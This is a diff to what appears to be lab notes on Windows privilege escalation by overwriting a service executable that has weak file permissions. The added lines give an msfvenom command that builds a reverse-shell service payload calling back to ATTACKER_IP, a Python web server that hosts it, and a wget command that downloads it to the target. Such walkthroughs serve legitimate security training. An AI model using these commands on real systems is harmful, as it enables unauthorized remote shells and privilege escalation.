@@ -567,9 +567,21 @@ The easiest way to gain access to another user is to gather credentials from a c
     `C:\Progra~2\System~1\WService.exe`: executable associated with the service  
 
     <img src="https://user-images.githubusercontent.com/73976100/224519275-269d8467-36cf-4084-b451-6621efd83f0c.png" width="600">  
-    
+
     The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.  
 
+    Let's generate an exe-service payload using msfvenom and serve it through a python webserver:  
+    ```
+    user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+
+    user@attackerpc$ python3 -m http.server
+    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+    ```  
+    We can then pull the payload from Powershell with the following command:  
+    ```
+    wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
+    ```  
+    
 
 
 
